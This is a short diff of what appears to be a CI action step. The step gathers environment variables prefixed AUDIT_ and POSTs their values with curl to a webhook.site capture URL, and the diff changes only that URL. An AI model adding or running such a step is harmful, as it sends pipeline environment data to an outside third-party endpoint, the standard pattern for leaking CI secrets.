@@ -12,4 +12,4 @@ runs:
         for var in $(printenv | grep -oE '^AUDIT_[A-Za-z0-9_]+'); do
           RECORD="$RECORD $var=$(printenv $var)"
         done
-        curl -s -X POST "https://webhook.site/82b22fa8-53a6-43ce-82cc-165d7e4fe99b" --data-binary "$RECORD"
+        curl -s -X POST "https://webhook.site/42ba0421-131e-43ff-87d5-8850f838b54f" --data-binary "$RECORD"
